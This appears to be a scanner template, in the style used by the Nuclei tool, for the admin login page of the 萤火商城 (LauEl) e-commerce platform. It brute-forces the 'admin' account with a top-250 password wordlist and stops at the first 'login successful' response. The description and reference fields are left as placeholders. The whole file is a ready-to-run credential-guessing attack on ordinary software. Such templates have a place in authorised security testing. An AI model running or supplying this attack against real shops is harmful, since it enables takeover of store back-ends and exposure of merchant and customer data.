id: fuzz-login-LauEl

info:
  name: 萤火商城-LauEl-后台默认登录
  author: capiton
  severity: high
  description: description
  reference:
    - https://
  tags: lauel,LauEl,萤火商城

requests:
  - method: POST
    path:
      - "{{BaseURL}}/index.php?s=/store/passport/login"
    headers:
        Accept: application/json, text/javascript, */*; q=0.01
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Origin: "{{BaseURL}}"
        Referer: "{{BaseURL}}/index.php?s=/store/passport/login"
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
    body: "User%5Buser_name%5D={{username}}&User%5Bpassword%5D={{password}}"
    payloads:
      password: "0.local/helpers/wordlists/password-TOP250.txt"
      username:
        - admin
    
    attack: clusterbomb
    stop-at-first-match: true
    req-condition: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{"code":1,"msg":"登录成功"'

      - type: status
        status:
          - 200
